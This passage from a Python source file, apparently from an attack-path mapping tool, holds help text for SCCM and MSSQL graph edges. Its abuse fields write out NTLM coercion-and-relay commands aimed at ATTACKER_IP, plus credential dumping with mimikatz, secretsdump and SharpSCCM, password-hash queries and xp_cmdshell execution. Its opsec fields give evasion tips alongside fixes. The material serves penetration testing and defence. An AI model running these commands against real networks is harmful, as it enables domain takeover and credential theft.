        ],
    ),
    ek.SCCM_APPLICATION_AUTHOR: EdgeHelp(
        general=(
            "The source SCCM administrative user is assigned the Application Author security "
            "role and is assigned a collection containing the target client device, allowing "
            "the user to modify existing applications and packages. Application Authors can "
            "gain code execution by swapping a deployed application's installation path with "
            "an attacker-controlled path and updating its detection method or version number "
            "so it is redeployed to the device."
        ),
        windowsAbuse=(
            "There is no public offensive tooling to abuse this edge at the time of this "
            "writing. Use the Microsoft Configuration Manager Console software in the context "
            "of the admin user to connect to an SMS Provider for any site in the hierarchy."
        ),
        opsec=(
            "Most actions in SCCM are logged to files in C:\\Program Files\\Microsoft "
            "Configuration Manager\\Logs. However, these logs are primarily for "
            "diagnostics/troubleshooting and it is uncommon for them to be forwarded to a SIEM."
        ),
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_COMPLIANCE_SETTINGS_MANAGER: EdgeHelp(
        general=(
            "The source SCCM administrative user is assigned the Compliance Settings Manager "
            "security role and is assigned a collection containing the target client device, "
            "allowing the user to create or modify configuration items or baselines and "
            "deploy them to the device."
        ),
        windowsAbuse=(
            "There is no public offensive tooling to abuse this edge at the time of this "
            "writing. Use the Microsoft Configuration Manager Console software in the context "
            "of the admin user to connect to an SMS Provider for any site in the hierarchy."
        ),
        opsec=(
            "Most actions in SCCM are logged to files in C:\\Program Files\\Microsoft "
            "Configuration Manager\\Logs. However, these logs are primarily for "
            "diagnostics/troubleshooting and it is uncommon for them to be forwarded to a SIEM."
        ),
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles",
            "https://learn.microsoft.com/en-us/intune/configmgr/compliance/deploy-use/deploy-configuration-baselines",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_OSD_MANAGER: EdgeHelp(
        general=(
            "The source SCCM administrative user is assigned the Operating System Deployment "
            "Manager security role and is assigned a collection containing the target client "
            "device, allowing the user to create and deploy task sequences to the device to "
            "gain remote command execution."
        ),
        windowsAbuse=(
            "There is no public offensive tooling to abuse this edge at the time of this "
            "writing. Use the Microsoft Configuration Manager Console software in the context "
            "of the admin user to connect to an SMS Provider for any site in the hierarchy."
        ),
        opsec=(
            "Most actions in SCCM are logged to files in C:\\Program Files\\Microsoft "
            "Configuration Manager\\Logs. However, these logs are primarily for "
            "diagnostics/troubleshooting and it is uncommon for them to be forwarded to a SIEM."
        ),
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_SECURITY_ADMINISTRATOR: EdgeHelp(
        general=(
            "The source SCCM administrative user is assigned the Security Administrator "
            "security role and is assigned a collection containing the target client device, "
            "allowing them to assign any security role to new or existing administrative "
            "users, limited to the collections the source user is assigned."
        ),
        windowsAbuse=(
            "There is no public offensive tooling to abuse this edge at the time of this "
            "writing. Use the Microsoft Configuration Manager Console software in the context "
            "of the admin user to connect to an SMS Provider for any site in the hierarchy or "
            "the `New-CMAdministrativeUser` Configuration Manager PowerShell cmdlet to assign "
            "a security role to a new or existing administrative user."
        ),
        opsec=(
            "Use of the Configuration Manager Console software is less likely to be detected "
            "than offensive tooling. Most actions in SCCM are logged to files in "
            "C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs "
            "are primarily for diagnostics/troubleshooting and it is uncommon for them to be "
            "forwarded to a SIEM. For more information, see the References tab."
        ),
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_HAS_MEMBER: EdgeHelp(
        general=(
            "This indicates that the SCCM collection contains the client device or user, and "
            "that the client device or user is a member of the collection."
        ),
        windowsAbuse=(
            "There is no specific abuse for this edge. SCCM administrators who are assigned "
            "this collection can perform actions on client devices and users within the "
            "collection that are permitted by their assigned security roles."
        ),
        linuxAbuse=(
            "There is no specific abuse for this edge. SCCM administrators who are assigned "
            "this collection can perform actions on client devices and users within the "
            "collection that are permitted by their assigned security roles."
        ),
        opsec="There are no OPSEC considerations related to this edge.",
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/clients/manage/collections/introduction-to-collections",
        ],
    ),
    ek.SCCM_HAS_STORED_ACCOUNT: EdgeHelp(
        general=(
            "This indicates that the SCCM site stores credentials for the target account (a "
            "\"reserved\" account such as a Network Access Account, client push installation "
            "account, or task sequence account). Because SCCM must recover the plaintext of "
            "these accounts to use them, they can be decrypted by anyone able to read the "
            "site's secret policy, the site database, or the DPAPI-protected blobs on the "
            "site server."
        ),
        windowsAbuse=(
            "From a Windows machine, in the context of a client (or any account that can "
            "request policy from a management point), request and decrypt the site's stored "
            "accounts with SharpSCCM (for example, `SharpSCCM.exe get secrets`), which "
            "requests the Network Access Account policy from a management point and decrypts "
            "it locally. With administrative access to the site server or site database, the "
            "same credentials can be recovered directly from the SCCM database or the DPAPI "
            "blobs under the SCCM installation directory. Recovered credentials can then be "
            "used to authenticate elsewhere in the environment."
        ),
        linuxAbuse=(
            "From a Linux machine, request and decrypt the site's secret policy (Network "
            "Access Accounts and collection variables) from a management point with a tool "
            "such as SCCMSecrets.py, or extract the credentials from the site database "
            "directly with database access. Recovered credentials can then be used to "
            "authenticate elsewhere in the environment."
        ),
        opsec=(
            "Requesting secret policy from a management point generates management point and "
            "policy request log entries, though these are diagnostic and rarely forwarded to "
            "a SIEM. Reading the site database or the site server's DPAPI blobs directly is "
            "quieter but requires prior privileged access to those systems."
        ),
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/accounts",
            "https://github.com/Mayyhem/SharpSCCM/wiki",
            "https://github.com/synacktiv/SCCMSecrets",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_CONTAINS: EdgeHelp(
        general=(
            "This indicates that the SCCM site contains the target object (a collection, "
            "security role, or administrative user). In a single hierarchy these objects are "
            "shared across every non-secondary site, so each site contains every global "
            "object. This is a structural relationship used for organization and traversal."
        ),
        windowsAbuse=(
            "There is no specific abuse for this edge. It represents SCCM's containment "
            "structure and supports attack-path traversal to the contained collections, "
            "security roles, and administrative users."
        ),
        linuxAbuse=(
            "There is no specific abuse for this edge. It represents SCCM's containment "
            "structure and supports attack-path traversal to the contained collections, "
            "security roles, and administrative users."
        ),
        opsec="There are no OPSEC considerations related to this edge.",
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/design-a-hierarchy-of-sites",
        ],
    ),
    ek.SCCM_SAME_HOST_AS: EdgeHelp(
        general=(
            "This indicates that the source and target nodes represent the same physical "
            "host: an Active Directory computer object and its corresponding SCCM client "
            "device. SCCM identifies clients by a client GUID rather than a domain SID, so "
            "this edge correlates the two identities for the same machine.\n"
            "The pairing is made by an exact FQDN/hostname match, using either an "
            "AdminService/WMI-enumerated client record (when that privilege is available) "
            "or, without it, a client device inferred solely from the CmRcService "
            "service-principal-name registered on the computer's AD object. When the "
            "client device on this edge is one of those possible (uncorroborated) "
            "devices, the pairing is itself only a possible one and is not produced when "
            "possible-edge collection is turned off. False positive: a stale DNS record, "
            "a decommissioned or renamed computer that kept its old SCCM client GUID, or "
            "a duplicate hostname elsewhere in the forest can pair this edge with the "
            "wrong AD computer."
        ),
        windowsAbuse=(
            "There is no specific abuse for this edge. It links a computer's Active Directory "
            "identity to its SCCM client identity so attack paths through one identity can be "
            "followed to the other (for example, from an SCCM client device to the AD "
            "computer that can be coerced or relayed, or vice versa)."
        ),
        linuxAbuse=(
            "There is no specific abuse for this edge. It links a computer's Active Directory "
            "identity to its SCCM client identity so attack paths through one identity can be "
            "followed to the other (for example, from an SCCM client device to the AD "
            "computer that can be coerced or relayed, or vice versa)."
        ),
        opsec="There are no OPSEC considerations related to this edge.",
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/clients/manage/client-installation-methods",
        ],
    ),
    ek.SCCM_LOCAL_ADMIN_REQUIRED: EdgeHelp(
        general=(
            "This indicates that the source computer (an SCCM site server) has local "
            "administrator rights on the target computer (another site system in the same "
            "site). SCCM site servers are configured as local administrators on the site "
            "systems they manage, and multiple site servers in the same site are mutually "
            "local administrators.\n"
            "OpenHound infers this edge from two computers tagged as site systems of the "
            "SAME site, joining the site-system role tags (built from RemoteRegistry SMS "
            "keys, the anonymous HTTP site-signing-certificate probe, and LDAP "
            "management-point capabilities) through the site hierarchy those same sources "
            "build -- it is not read from an actual local-group membership list. The role "
            "tags and hierarchy are directly observed, not guessed, so this edge is "
            "produced the same way at every collection privilege level. False positive: "
            "an administrator who removed the default local-administrators grant during a "
            "hardening pass, or a role tag attributed to the wrong site, will make this "
            "edge overstate real access -- confirm actual local-group membership on the "
            "target before relying on it."
        ),
        windowsAbuse=(
            "If you control the source site server, you already have local administrator "
            "access to the target site system. Move laterally to it with any administrative "
            "remote-access method (SMB/PsExec, WMI, WinRM, or remote service creation), then "
            "dump credentials or LSASS on the target to capture the identities of accounts "
            "with sessions there."
        ),
        linuxAbuse=(
            "From a Linux machine, use the source site server's credentials (or a "
            "coercion/relay primitive) with Impacket tools such as psexec.py, wmiexec.py, or "
            "smbexec.py to gain administrative command execution on the target site system, "
            "then dump credentials remotely with secretsdump.py."
        ),
        opsec=(
            "Administrative lateral movement (PsExec-style service creation, WMI, WinRM) and "
            "credential dumping are commonly monitored by EDR. Prefer least-noisy techniques "
            "and be aware that LSASS access may be flagged. For more information, see the "
            "References tab."
        ),
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/configs/site-and-site-system-prerequisites",
            "https://attack.mitre.org/techniques/T1021/",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_COERCE_AND_RELAY_TO_ADMIN_SERVICE: EdgeHelp(
        general=(
            "A Site Server can be coerced into authenticating to an SMS Provider whose "
            "AdminService accepts NTLM (inbound NTLM is not restricted), allowing the coerced "
            "authentication to be relayed to the AdminService to gain administrative control "
            "of the site. This is a possible edge, emitted when the relay target's inbound "
            "NTLM restriction is unset or 'Off'. The source is the Authenticated Users "
            "principal of the site server's domain, and the target is the SCCM site. Note: "
            "starting with Configuration Manager version 2509, the AdminService rejects NTLM "
            "authentication, which breaks this relay path. The relay target's NTLM-restriction "
            "state is read directly from its registry when RemoteRegistry access is available, "
            "rather than assumed off by default, so this edge only appears when that setting "
            "was actually observed unset or 'Off'."
        ),
        windowsAbuse=(
            "Coerce and relay authentication to the SMS Provider's AdminService. AdminService "
            "relay is NOT in mainline Impacket; until it is merged, use Garrett Foster's "
            "(unsigned_sh0rt) fork / pull request #1593, which adds the `--adminservice` "
            "flag.\n\n"
            "# 1. Set up the (forked) NTLM relay to add your account as a Full Administrator\n"
            "`ntlmrelayx.py --adminservice --logonname '<attacker_domain>\\<attacker>' "
            "--displayname '<attacker_domain>\\<attacker>' --objectsid <attacker_sid> "
            "-smb2support -t https://<sms_provider_fqdn>/AdminService/wmi/SMS_Admin`\n\n"
            "# 2. Trigger authentication from the Site Server using:\n"
            "# - PrinterBug/SpoolSample\n"
            "`SpoolSample.exe SITE_SERVER ATTACKER_IP`\n"
            "# - PetitPotam\n"
            "`PetitPotam.exe ATTACKER_IP SITE_SERVER`\n"
            "# - Coercer\n"
            "`coercer.py coerce -u '' -p '' -t SITE_SERVER -l ATTACKER_IP`\n\n"
            "# 3. The relayed site server authentication adds your account (the supplied SID)\n"
            "#    as an SCCM Full Administrator, granting control of the hierarchy.\n\n"
            "See the Misconfiguration Manager TAKEOVER-5 technique in the References section."
        ),
        linuxAbuse=(
            "Coerce and relay authentication to the SMS Provider's AdminService. AdminService "
            "relay is NOT in mainline Impacket; until it is merged, use Garrett Foster's "
            "(unsigned_sh0rt) fork / pull request #1593, which adds the `--adminservice` "
            "flag.\n\n"
            "# 1. Set up the (forked) NTLM relay to add your account as a Full Administrator\n"
            "`ntlmrelayx.py --adminservice --logonname '<attacker_domain>\\<attacker>' "
            "--displayname '<attacker_domain>\\<attacker>' --objectsid <attacker_sid> "
            "-smb2support -t https://<sms_provider_fqdn>/AdminService/wmi/SMS_Admin`\n\n"
            "# 2. Trigger authentication from the Site Server using:\n"
            "# - PetitPotam (unauthenticated)\n"
            "`python3 PetitPotam.py ATTACKER_IP SITE_SERVER`\n"
            "# - Coercer\n"
            "`coercer.py coerce -u '' -p '' -t SITE_SERVER -l ATTACKER_IP`\n"
            "# - PrinterBug via Wine\n"
            "`wine SpoolSample.exe SITE_SERVER ATTACKER_IP`\n\n"
            "# 3. The relayed site server authentication adds your account (the supplied SID)\n"
            "#    as an SCCM Full Administrator, granting control of the hierarchy.\n\n"
            "See the Misconfiguration Manager TAKEOVER-5 technique in the References section."
        ),
        opsec=(
            "Coercion methods may generate logon events on the target system (Event ID "
            "4624/4625). Actions performed through the AdminService are written to the SCCM "
            "diagnostic logs, though these are rarely forwarded to a SIEM. This is a possible "
            "edge: it is emitted when the relay target's inbound NTLM restriction is unset or "
            "'Off'. Restricting inbound NTLM on the SMS Provider prevents this attack. "
            "Additionally, Configuration Manager version 2509 and later reject NTLM at the "
            "AdminService, which breaks this relay path entirely."
        ),
        references=[
            "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-5/takeover-5_description.md",
            "https://github.com/fortra/impacket/pull/1593",
            "https://github.com/topotam/PetitPotam",
            "https://github.com/p0dalirius/Coercer",
            "https://github.com/Mayyhem/SharpSCCM/wiki",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.MSSQL_COERCE_AND_RELAY_TO_MSSQL: EdgeHelp(
        general=(
            "A computer with a sysadmin login on the SCCM site database can be coerced into "
            "authenticating to the site database server, whose MSSQL service does not enforce "
            "Extended Protection for Authentication, allowing the coerced authentication to "
            "be relayed to MSSQL as that sysadmin login. Control of the site database grants "
            "all permissions in SCCM. This is a possible edge, emitted when the relay "
            "target's Extended Protection is unset or 'Off' and the sysadmin host's inbound "
            "NTLM restriction is unset or 'Off'. The source is the Authenticated Users "
            "principal of the coerced computer's domain, and the target is the MSSQL login. "
            "Extended Protection is read directly from the target's registry (RemoteRegistry, "
            "when reachable) or measured by the MSSQL EPA/encryption probe run during "
            "collection; nothing about it is assumed off by default."
        ),
        windowsAbuse=(
            "Coerce and relay authentication to SQL Server:\n\n"
            "# 1. Set up an NTLM relay targeting the site database server\n"
            "`ntlmrelayx.py -t mssql://<site_database_server> -smb2support`\n\n"
            "# 2. Trigger authentication from the sysadmin computer using:\n"
            "# - PrinterBug/SpoolSample\n"
            "`SpoolSample.exe SYSADMIN_COMPUTER ATTACKER_IP`\n"
            "# - PetitPotam\n"
            "`PetitPotam.exe ATTACKER_IP SYSADMIN_COMPUTER`\n"
            "# - Coercer\n"
            "`coercer.py coerce -u '' -p '' -t SYSADMIN_COMPUTER -l ATTACKER_IP`\n\n"
            "# 3. The relay logs in to MSSQL as DOMAIN\\COMPUTER$ (a sysadmin), from which\n"
            "#    the site database's RBAC can be modified to grant an arbitrary user any\n"
            "#    permission.\n\n"
            "See the Misconfiguration Manager TAKEOVER-1 technique in the References section."
        ),
        linuxAbuse=(
            "Coerce and relay authentication to SQL Server:\n\n"
            "# 1. Set up an NTLM relay targeting the site database server\n"
            "`ntlmrelayx.py -t mssql://<site_database_server> -smb2support`\n\n"
            "# 2. Trigger authentication from the sysadmin computer using:\n"
            "# - PetitPotam (unauthenticated)\n"
            "`python3 PetitPotam.py ATTACKER_IP SYSADMIN_COMPUTER`\n"
            "# - Coercer\n"
            "`coercer.py coerce -u '' -p '' -t SYSADMIN_COMPUTER -l ATTACKER_IP`\n"
            "# - PrinterBug via Wine\n"
            "`wine SpoolSample.exe SYSADMIN_COMPUTER ATTACKER_IP`\n\n"
            "# 3. The relay logs in to MSSQL as DOMAIN\\COMPUTER$ (a sysadmin), from which\n"
            "#    the site database's RBAC can be modified to grant an arbitrary user any\n"
            "#    permission.\n\n"
            "See the Misconfiguration Manager TAKEOVER-1 technique in the References section."
        ),
        opsec=(
            "Coercion methods may generate logon events on the target system (Event ID "
            "4624/4625). SQL Server logs will show authentication from the computer account "
            "(DOMAIN\\COMPUTER$). This is a possible edge: it is emitted when the relay "
            "target's Extended Protection is unset or 'Off' and the sysadmin host's inbound "
            "NTLM restriction is unset or 'Off'. Enabling Extended Protection for "
            "Authentication on the MSSQL service prevents this attack."
        ),
        references=[
            "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md",
            "https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/connect-to-the-database-engine-using-extended-protection?view=sql-server-ver17",
            "https://github.com/topotam/PetitPotam",
            "https://github.com/p0dalirius/Coercer",
            "https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_COERCE_AND_RELAY_TO_SMB: EdgeHelp(
        general=(
            "A Site Server can be coerced into authenticating to a site system that does not "
            "require SMB signing, allowing the coerced authentication to be relayed over SMB "
            "to gain local administrator access to that site system (site servers are local "
            "administrators on their site systems). This is a possible edge, emitted when the "
            "target's SMB signing is not required and its inbound NTLM restriction is unset "
            "or 'Off'. The source is the Authenticated Users principal of the site server's "
            "domain, and the target is the vulnerable site system computer. Signing is "
            "measured directly by negotiating an SMB2 session with the target (no "
            "credentials required); the NTLM-restriction state is read from the target's "
            "registry when RemoteRegistry access is available."
        ),
        windowsAbuse=(
            "Coerce and relay authentication over SMB:\n\n"
            "# 1. Set up an NTLM relay targeting the site system's SMB service\n"
            "`ntlmrelayx.py -t smb://<target_site_system> -smb2support`\n\n"
            "# 2. Trigger authentication from the Site Server using:\n"
            "# - PrinterBug/SpoolSample\n"
            "`SpoolSample.exe SITE_SERVER ATTACKER_IP`\n"
            "# - PetitPotam\n"
            "`PetitPotam.exe ATTACKER_IP SITE_SERVER`\n"
            "# - Coercer\n"
            "`coercer.py coerce -u '' -p '' -t SITE_SERVER -l ATTACKER_IP`\n\n"
            "# 3. Because the target does not require SMB signing, the relay authenticates as\n"
            "#    the site server (a local admin); add -c or -e to ntlmrelayx to run a command\n"
            "#    or dump SAM/secrets on the target.\n\n"
            "See the Misconfiguration Manager TAKEOVER-2, TAKEOVER-6, and TAKEOVER-7 "
            "techniques in the References section."
        ),
        linuxAbuse=(
            "Coerce and relay authentication over SMB:\n\n"
            "# 1. Set up an NTLM relay targeting the site system's SMB service\n"
            "`ntlmrelayx.py -t smb://<target_site_system> -smb2support`\n\n"
            "# 2. Trigger authentication from the Site Server using:\n"
            "# - PetitPotam (unauthenticated)\n"
            "`python3 PetitPotam.py ATTACKER_IP SITE_SERVER`\n"
            "# - Coercer\n"
            "`coercer.py coerce -u '' -p '' -t SITE_SERVER -l ATTACKER_IP`\n"
            "# - PrinterBug via Wine\n"
            "`wine SpoolSample.exe SITE_SERVER ATTACKER_IP`\n\n"
            "# 3. Because the target does not require SMB signing, the relay authenticates as\n"
            "#    the site server (a local admin); add -c or -e to ntlmrelayx to run a command\n"
            "#    or dump SAM/secrets on the target.\n\n"
            "See the Misconfiguration Manager TAKEOVER-2, TAKEOVER-6, and TAKEOVER-7 "
            "techniques in the References section."
        ),
        opsec=(
            "Coercion methods may generate logon events on the target system (Event ID "
            "4624/4625). SMB relay that executes commands or dumps secrets is more likely to "
            "be detected by EDR. This is a possible edge: it is emitted when the target's SMB "
            "signing is not required and its inbound NTLM restriction is unset or 'Off'. "
            "Requiring SMB signing on site systems prevents this attack."
        ),
        references=[
            "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-2/takeover-2_description.md",
            "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-6/takeover-6_description.md",
            "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-7/takeover-7_description.md",
            "https://github.com/topotam/PetitPotam",
            "https://github.com/p0dalirius/Coercer",
            "https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    # MSSQL edge help ported from MSSQLHound.ps1 (EdgePropertyGenerators), genericized
    # (variable substitution / node-type conditionals collapsed to generic wording) and
    # with Composition omitted. These edges are emitted by the SCCM collector's Stage 5.
    ek.MSSQL_CONTAINS: EdgeHelp(
        general=(
            "The source object contains the target object. This is a structural relationship "
            "showing that the target exists within the scope of the source (for example, a "
            "SQL Server containing a database, login, or server role, or a database "
            "containing a database user, database role, or application role).\n"
            "On the SCCM site database specifically, this structure (the database, the "
            "sysadmin role, and the site-server/provider logins and users it contains) is "
            "templated from SCCM's own default-schema requirements rather than read out "
            "of the live instance. It is trustworthy in proportion to how the site "
            "database was identified: fully so when RemoteRegistry, AdminService, or WMI "
            "confirmed it, and only an assumption when the server was instead inferred "
            "from an MSSQLSvc SPN plus its co-location with other SCCM roles, with "
            "nothing confirming it is actually the site database."
        ),
        windowsAbuse=(
            "This is a structural relationship and cannot be directly abused. Control of the "
            "source object implies control of the target object."
        ),
        linuxAbuse=(
            "This is a structural relationship and cannot be directly abused. Control of the "
            "source object implies control of the target object."
        ),
        references=[
            "https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/principals-database-engine?view=sql-server-ver17",
        ],
    ),
    ek.MSSQL_CONTROL_SERVER: EdgeHelp(
        general=(
            "The `CONTROL SERVER` permission on a server allows the source login or server "
            "role to conduct any action in the instance of SQL Server that is not explicitly "
            "denied. An exception is for members of the sysadmin server role, in which case "
            "explicit denies are ignored.\n"
            "On an SCCM site database server, this reflects the sysadmin membership SCCM "
            "requires its site-system and provider machine accounts to hold, templated "
            "rather than queried from `sys.server_role_members`. Trust it the same way as "
            "the site-database identification behind it: solid when RemoteRegistry, "
            "AdminService, or WMI confirmed the server; an assumption, weaker and "
            "provenance-tagged, when the server was only inferred from an MSSQLSvc SPN "
            "plus its co-location with other SCCM roles."
        ),
        windowsAbuse=(
            "Connect to the target SQL server (e.g., using sqlcmd, SQL Server Management "
            "Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and "
            "execute the following SQL statement:\n"
            "`SELECT * FROM sys.sql_logins; -- dump hashes`"
        ),
        linuxAbuse=(
            "Connect to the target SQL server (e.g., using impacket mssqlclient.py or proxied "
            "Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and "
            "execute the following SQL statement:\n"
            "`SELECT * FROM sys.sql_logins; -- dump hashes`"
        ),
        opsec=(
            "SQL Server logs certain security-related events to a trace log by default, but "
            "must be configured to forward them to a SIEM. The local log may roll over "
            "frequently on large, active servers, as the default storage size is only 20 MB. "
            "Furthermore, the default trace log is deprecated and may be removed in future "
            "versions to be replaced permanently by Extended Events.\n"
            "Log event generation is dependent on the action performed."
        ),
        references=[
            "https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#sql-server-permissions",
            "https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17",
            "https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17",
        ],
    ),
    ek.MSSQL_CONTROL_DB: EdgeHelp(
        general=(
            "The `CONTROL` permission on a database grants the source database user, database "
            "role, or application role all defined permissions on the database and its "
            "descendent objects. This includes the ability to impersonate any database user, "
            "add members to any role, change ownership of objects, and execute any action "
            "within the database. WARNING: This includes the ability to change application "
            "role passwords, which will break applications using those roles and cause an "
            "outage.\n"
            "When the target database is the SCCM site database, this permission is a "
            "consequence of SCCM's mandatory default schema (db_owner over CM_<SiteCode>) "
            "rather than a value read from the database's own permission tables. That "
            "inference is only as strong as the site-database identification behind it: "
            "solid when RemoteRegistry, AdminService, or WMI confirmed the database "
            "server, an assumption when the server was only inferred from an MSSQLSvc SPN "
            "plus its co-location with other SCCM roles."
        ),
        windowsAbuse=(
            "Connect to the target SQL server as the source principal (e.g., using sqlcmd, "
            "SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as "
            "impacket mssqlclient.py) and execute the following SQL statements:\n"
            "`USE target_database;`\n"
            "Impersonate user: `EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT;`\n"
            "Add member to role: `EXEC sp_addrolemember 'role_name', 'user_name';`\n"
            "Change role owner: `ALTER AUTHORIZATION ON ROLE::[role_name] TO [user_name];`\n"
            "Change app role password: WARNING: DO NOT execute this attack, as it will "
            "immediately break the application that relies on this application role to access "
            "this database and WILL cause an outage."
        ),
        linuxAbuse=(
            "Connect to the target SQL server as the source principal (e.g., using impacket "
            "mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL "
            "Server Management Studio) and execute the following SQL statements:\n"
            "`USE target_database;`\n"
            "Impersonate user: `EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT;`\n"
            "Add member to role: `EXEC sp_addrolemember 'role_name', 'user_name';`\n"
            "Change role owner: `ALTER AUTHORIZATION ON ROLE::[role_name] TO [user_name];`\n"
            "Change app role password: WARNING: DO NOT execute this attack, as it will "
            "immediately break the application that relies on this application role to access "
            "this database and WILL cause an outage."
        ),
        opsec=(
            "SQL Server logs certain security-related events to a trace log by default, but "
            "must be configured to forward them to a SIEM. The local log may roll over "
            "frequently on large, active servers, as the default storage size is only 20 MB. "
            "Furthermore, the default trace log is deprecated and may be removed in future "
            "versions to be replaced permanently by Extended Events.\n"
            "Log events are not generated for user impersonation, role ownership changes, or "
            "application role password changes by default. Log events are generated by "
            "default for additions to database role membership.\n"
            "To view database role membership change logs, execute:\n"
            "`SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN "
            "EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = "
            "110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in "
            "database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT "
            "CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), "
            "DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC;`"
        ),
        references=[
            "https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions",
            "https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17",
            "https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17",
            "https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-application-role-transact-sql?view=sql-server-ver17",
            "https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17",
        ],
    ),
    ek.MSSQL_HOST_FOR: EdgeHelp(
        general="The source computer hosts the target SQL Server instance.",
        windowsAbuse=(
            "With admin access to the host, you can access the SQL instance:\n"
            "If the SQL instance is running as a built-in account (Local System, Local "
            "Service, or Network Service), it can be accessed with a SYSTEM context with "
            "sqlcmd.\n"
            "If the SQL instance is running in a domain service account context, the cleartext "
            "credentials can be dumped from LSA secrets with mimikatz "
            "`sekurlsa::logonpasswords`, then they can be used to request a service ticket for "
            "a domain account with admin access to the SQL instance.\n"
            "If there are no domain DBAs, it is still possible to start the instance in "
            "single-user mode, which allows any member of the computer's local Administrators "
            "group to connect as a sysadmin. WARNING: This is disruptive, possibly "
            "destructive, and will cause the database to become unavailable to other users "
            "while in single-user mode. It is not recommended."
        ),
        linuxAbuse=(
            "If you have root access to the host, you can access SQL Server by manipulating "
            "the service or accessing database files directly."
        ),
        opsec=(
            "Host access allows reading memory, modifying binaries, and accessing database "
            "files directly."
        ),
        references=[
            "https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-ver17",
            "https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/start-sql-server-in-single-user-mode?view=sql-server-ver17",
        ],
    ),
    ek.MSSQL_EXECUTE_ON_HOST: EdgeHelp(
        general=(
            "Control of a SQL Server instance allows xp_cmdshell or other OS command "
            "execution capabilities to be used to access the host computer in the context of "
            "the account running the SQL server."
        ),
        windowsAbuse=(
            "Enable and use xp_cmdshell: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; "
            "EXEC xp_cmdshell 'whoami';`"
        ),
        linuxAbuse=(
            "Enable and use xp_cmdshell: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; "
            "EXEC xp_cmdshell 'whoami';`"
        ),
        opsec=(
            "xp_cmdshell configuration option changes are logged in SQL Server error logs. "
            "View the log by executing: `EXEC sp_readerrorlog 0, 1, 'xp_cmdshell';`"
        ),
        references=[
            "https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17",
        ],
    ),
    ek.MSSQL_HAS_LOGIN: EdgeHelp(
        general=(
